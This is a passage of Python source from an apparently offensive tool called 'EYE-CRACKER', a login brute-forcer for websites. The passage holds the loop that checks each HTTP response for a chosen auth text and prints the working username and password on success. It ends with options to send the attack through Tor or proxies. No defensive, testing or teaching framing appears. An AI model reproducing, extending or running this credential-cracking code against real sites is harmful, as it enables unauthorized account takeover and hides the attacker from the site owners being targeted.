                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                #print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                continue
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                            continue
                        try:
                            t.sleep(slep)
                        except:
                            pass

                    except:
                        pass
                        #break

    if tor_use == True:
        WithTor()
    if proxy_use == True:
        WithProxy()
    else:
        noProxy()



